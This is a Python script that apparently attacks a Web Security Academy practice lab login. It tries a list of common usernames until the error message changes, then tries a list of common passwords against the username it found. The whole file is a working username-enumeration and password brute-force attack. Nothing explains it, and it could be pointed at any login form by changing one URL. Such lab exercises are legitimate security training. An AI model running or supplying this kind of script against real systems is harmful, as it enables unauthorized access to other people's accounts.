import requests
from bs4 import BeautifulSoup

login_url = 'https://0a7f00a703d629e8800008770082004c.web-security-academy.net/login'

usernames = [
    "carlos", "root", "admin", "test", "guest", "info", "adm", "mysql", 
    "user", "administrator", "oracle", "ftp", "pi", "puppet", "ansible", 
    "ec2-user", "vagrant", "azureuser", "academico", "acceso", "access", 
    "accounting", "accounts", "acid", "activestat", "ad", "adam", "adkit", 
    "admin", "administracion", "administrador", "administrator", 
    "administrators", "admins", "ads", "adserver", "adsl", "ae", "af", 
    "affiliate", "affiliates", "afiliados", "ag", "agenda", "agent", 
    "ai", "aix", "ajax", "ak", "akamai", "al", "alabama", "alaska", 
    "albuquerque", "alerts", "alpha", "alterwind", "am", "amarillo", 
    "americas", "an", "anaheim", "analyzer", "announce", "announcements", 
    "antivirus", "ao", "ap", "apache", "apollo", "app", "app01", "app1", 
    "apple", "application", "applications", "apps", "appserver", "aq", 
    "ar", "archie", "arcsight", "argentina", "arizona", "arkansas", 
    "arlington", "as", "as400", "asia", "asterix", "at", "athena", 
    "atlanta", "atlas", "att", "au", "auction", "austin", "auth", 
    "auto", "autodiscover"
]
passwords = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", 
    "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", 
    "football", "monkey", "letmein", "shadow", "master", "666666", 
    "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", 
    "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", 
    "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", 
    "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", 
    "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", 
    "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", 
    "112233", "george", "computer", "michelle", "jessica", "pepper", 
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", 
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", 
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", 
    "biteme", "matthew", "access", "yankees", "987654321", "dallas", 
    "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", 
    "monitor", "monitoring", "montana", "moon", "moscow"
]

session = requests.Session()

print("Searching...")
for username in usernames:
    login_data = {
        'username': username,
        'password': passwords[1]
    }
    print(f"Trying username: {username}, {passwords[1]}")
    response = session.post(login_url, data=login_data)
    if "Invalid username or password." not in response.text:
        print(response.text)
        soup = BeautifulSoup(response.text, 'html.parser')
        warning = soup.find('p', class_='is-warning')
        print(warning)
        print(warning.text)
        print(f"Found credentials: username: {username}")
        print("")
        for password in passwords:
            login_data = {
                'username': username,
                'password': password
            }
            print(f"Trying password: {password}")
            response = session.post(login_url, data=login_data)
            if "Invalid username or password" not in response.text:
                print(f"Found credentials: username:{username}, password:{password}")
                break
        break